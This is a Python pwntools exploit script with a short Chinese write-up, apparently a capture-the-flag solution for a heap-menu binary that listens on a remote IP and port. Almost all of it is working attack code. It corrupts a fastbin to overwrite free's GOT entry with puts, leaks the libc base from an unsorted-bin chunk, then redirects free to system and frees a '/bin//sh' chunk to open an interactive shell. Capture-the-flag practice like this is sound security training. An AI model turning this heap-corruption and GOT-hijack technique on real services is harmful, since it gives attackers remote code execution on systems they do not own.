from pwn import *
import sys
context.arch = 'amd64'

print sys.argv
if len(sys.argv) == 2 and sys.argv[1] == 'remote':
    r = remote('35.201.132.60',50216)
else:
    r = remote('localhost',8888)
#r.interactive()
def create(size,data):
    r.send('1')
    r.recvuntil('Size')
    r.send(str(size))
    r.recvuntil('Content')
    r.send(data)
    r.recvuntil('SuccessFul')

def edit(idx, size, data):
    r.sendline('2')
    r.recvuntil('Index')
    r.send(str(idx))
    r.recvuntil('Size')
    r.send(str(size))
    r.recvuntil('Content')
    r.send(data)
    r.recvuntil('Done')

def delete(idx):
    r.sendline('3')
    r.recvuntil('Index')
    r.send(str(idx))

#after replacing free with puts
def leak(idx):
    r.sendline('3')
    r.recvuntil('Index :')
    r.send(str(idx))
    info = r.recvuntil('Done')[:-5]
    return info
"""
    Write up
    
    --------
    首先name我不知道是要幹嘛用的
    宣告了3個fastbin大小的chunk 避免merge到top chunk
    要利用前兩個做fastbin corruption直接改掉free got -> puts
    
    宣告三個unsorted bin大小的chunk 
    先free掉其中一個 使其存有unsorted bin的位置資訊 用來做libc base leak
    透過重複宣告同樣大小的chunk，利用puts得到libc位置

    再利用先前hijcak got的方式把free改成system
    free掉存有/bin//sh\0的chunk得到shell



"""
#Name
r.recvuntil('Name')
r.send('payo')
r.recvuntil('-')

create(0x50, 'A') #0
create(0x50, 'B') #1
create(0x50, 'C') #2

create(0x90, '/bin//sh\0') #3
create(0x90, 'E') #4
create(0x90, 'F') #5

delete(2)
delete(1)
#unsorted bin, FIFO
delete(4)

#hijcak got
target = 0x602002 - 0x8
data = 'x'*0x58 + p64(0x61) + p64(target) 
edit(0, 0x68, data)
create(0x50, 'E') #1

puts_plt = 0x4006b0
create(0x50, '123456' + p64(0xfaceb00c) + p64(puts_plt)) #2

#now the free@plt has been replace with puts@plt
#use free to leak info
create(0x90, 'x'*8) #4
info = leak(4)[8:]
info = u64(info.ljust(8, '\0'))
unsorted_bin_off = 0x3c4b78 
libc = info - 0x3c4b78
print hex(libc)

system_addr = libc + 0x45390
edit(2,0x50, '123456' + p64(0xfaceb00c) + p64(system_addr)) #2

delete(3)
r.interactive()
